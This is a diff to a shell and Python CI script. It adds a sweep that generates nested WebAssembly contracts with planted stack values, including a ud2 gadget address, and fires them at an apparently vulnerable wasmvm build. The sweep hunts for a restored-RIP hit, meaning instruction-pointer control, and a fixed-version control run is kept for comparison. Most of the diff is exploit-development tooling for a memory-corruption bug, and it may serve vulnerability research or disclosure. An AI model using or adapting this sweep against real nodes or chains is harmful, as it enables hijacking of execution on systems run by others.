@@ -354,6 +354,33 @@ PYEOF
     done
   fi
 
+
+  echo "--- PAT24: staged=24 pattern + ud2 rotations at the dfp24 window (r=280..283) ---"
+  echo "    dfp24 found marker reads at r=281/282 (k2/k0) for staged=24 - the deeper-frame window." >&2
+  echo "    Pattern at the consumed member + ud2 rotating through the rest hunts a restored-RIP hit." >&2
+  if [ -n "$PAT_ADDR" ]; then
+    for spec in "280 4" "281 2" "282 0" "283 5"; do
+      set -- $spec; R=$1; ANCHOR=$2
+      for SLOT in 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
+        [ "$SLOT" = "$ANCHOR" ] && continue
+        vals=""
+        for k in $(seq 0 15); do
+          if [ $k -eq $ANCHOR ]; then v=$PAT_ADDR
+          elif [ $k -eq $SLOT ]; then v=0x47c624
+          else v=$((0x414100000000 + k)); fi
+          vals="${vals}${vals:+,}0x$(printf %x $v)"
+        done
+        D12="$NESTED/pat24_r${R}_s${SLOT}"
+        python3 "$NESTED/gen_nested_contracts.py" "$D12" --offset $((512-R)) --iters $((65536+R+1)) --dummy 0 --frame32 0 --staged 24 --plant-values "$vals" > /dev/null 2>&1 || continue
+        for w in holder trigger benign; do
+          "$PY" -c "import wasmtime; open('$D12/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D12/$w.wat').read()))" 2>/dev/null
+        done
+        timeout 120 ./harness/harness -wasm "$D12/holder.wasm" -trigger "$D12/trigger.wasm" -benign "$D12/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-pat24-r${R}-s${SLOT}.json" > "ci-out/harness/nested-vuln-pat24-r${R}-s${SLOT}.stdout" 2> "ci-out/harness/nested-vuln-pat24-r${R}-s${SLOT}.stderr" || true
+      done
+      echo "  pat24 r$R anchor$ANCHOR done" | tee -a "$OUT/sweep.log"
+    done
+  fi
+
   echo "--- fixed control (wasmvm 3.0.8, r=256) ---"
   D="$NESTED/build_r256"
   if timeout 120 ./harness-fixed/harness-fixed -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 4 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-fixed-r256.json" > "ci-out/harness/nested-fixed-r256.stdout" 2> "ci-out/harness/nested-fixed-r256.stderr"; then
@@ -371,7 +398,10 @@ gadget_consumed = []
 
 def classify(f, dummy):
     base = f.split("/")[-1]
-    if base.startswith("nested-vuln-pat-"):
+    if base.startswith("nested-vuln-pat24-"):
+        mm = re.search(r'pat24-r(\d+)-s(\d+)', f)
+        tag = f"pat24/r{mm.group(1)}/s{mm.group(2)}" if mm else f"pat24/{base}"
+    elif base.startswith("nested-vuln-pat-"):
         mm = re.search(r'pat-f(\d+)-d(\d+)-r(\d+)-a(\d+)', f)
         tag = f"pat/f{mm.group(1)}/d{mm.group(2)}/r{mm.group(3)}/a{mm.group(4)}" if mm else f"pat/{base}"
     elif base.startswith("nested-vuln-mk24-"):
@@ -466,6 +496,8 @@ for f in sorted(glob.glob("ci-out/harness/nested-vuln-can-*.stderr")):
 for f in sorted(glob.glob("ci-out/harness/nested-vuln-mk-*.stderr")):
     classify(f, None)
 for f in sorted(glob.glob("ci-out/harness/nested-vuln-dfp-*.stderr")):
+    classify(f, None)
+for f in sorted(glob.glob("ci-out/harness/nested-vuln-pat24-*.stderr")):
     classify(f, None)
 for f in sorted(glob.glob("ci-out/harness/nested-vuln-p*at-*.stderr")):
     classify(f, None)
